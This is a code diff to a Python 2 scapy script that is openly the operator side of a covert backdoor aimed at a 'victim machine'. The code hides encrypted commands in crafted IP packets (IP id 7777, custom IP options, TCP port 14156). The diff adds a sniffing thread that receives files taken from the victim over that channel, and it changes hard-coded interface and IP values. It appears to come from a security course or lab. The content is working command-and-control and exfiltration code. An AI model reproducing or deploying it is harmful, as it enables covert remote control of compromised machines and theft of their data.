@@ -41,13 +41,14 @@ import socket
 import fcntl
 import struct
 import time
+import threading
 
 
 
-NETCARD = 'enp0s3'
+NETCARD = 'en4'
 KEY = "runningman"
-src_ip = "192.168.0.16"	# by default
-dst_ip = "192.168.0.17"	# by default
+src_ip = "192.168.1.5"	# by default
+dst_ip = "192.168.1.9"	# by default
 
 
 # ###################################################################
@@ -152,6 +153,37 @@ def stopfilter(pkt):
 					return False
 	return False
 
+
+def recv_file_filter(pkt):
+	global dst_ip
+
+	if ARP in pkt:		# check if the packet has APR packet
+		return False
+	elif DHCP in pkt:	# check if the packet has DHCP packet
+		return False
+	elif UDP in pkt:	# check if the packet has UDP packet
+		return False
+	elif pkt[IP].options != None and pkt[IP].id == 7777:	# check option exists and packet IP id header
+		if pkt[IP].src == dst_ip:	# check IP address if it is from victim machine
+			if pkt[TCP].dport == 14156 :	# check TCP dst port
+				try:
+					# extract data from 'Raw' field
+					enc_rst = pkt[Raw].load
+					# decrypt the encrypted data
+					# rst = decrypt(enc_rst, KEY)
+					print "##############################    RESULT    ######################################"
+					print enc_rst
+					print "##################################################################################"
+					return True
+				except IndexError as e:		
+					print "[Packet Skipped]"
+					return False
+	return False
+
+def recv_file():
+	while(1):
+		sniff(filter="src {} and tcp".format(dst_ip), count=1, stop_filter=recv_file_filter)	
+
 # ###################################################################
 #	Function: main
 #	Input: None
@@ -169,18 +201,29 @@ def main():
 	global KEY
 
 	# wait for the signal that victim runs the backdoor server
-	print "Waiting for server to connect..."
-	sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor, count=1)
+	# print "Waiting for server to connect..."
+	# sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor, count=1)
 
-	# get command	
-	while True:
-		cmd = get_input()
-		# encrypt command
-		enc_cmd = encrypt(cmd, KEY)
-		# send the length of input
-		send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=enc_cmd))
-		# sniff packets from the backdoor server
-		sniff(filter="src {} and tcp".format(dst_ip), stop_filter=stopfilter)	
+	# start thread
+	t = threading.Thread(name="watchfile_threading", target=recv_file)
+
+	try:
+		t.start()
+	except (KeyboardInterrupt, SystemExit):
+	    cleanup_stop_thread();
+	    sys.exit()
+	
+	# while True:
+	# 	cmd = get_input()
+	# 	# encrypt command
+	# 	enc_cmd = encrypt(cmd, KEY)
+	# 	# send the length of input
+	# 	send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=enc_cmd))
+	# 	# sniff packets from the backdoor server
+	# 	sniff(filter="src {} and tcp".format(dst_ip), stop_filter=stopfilter)	
+
+
+	t.join()
 
 if __name__ == '__main__':
 	try:
@@ -190,9 +233,9 @@ if __name__ == '__main__':
 		args = parser.parse_args()
 
 		# get the source ip address
-		src_ip = get_ip_address(NETCARD)
+		# src_ip = get_ip_address(NETCARD)
 		# get the destination ip address from user specified
-		dst_ip = args.dest_ip
+		# dst_ip = args.dest_ip
 		print "Source IP:", src_ip
 		print "Destination IP:", dst_ip
 
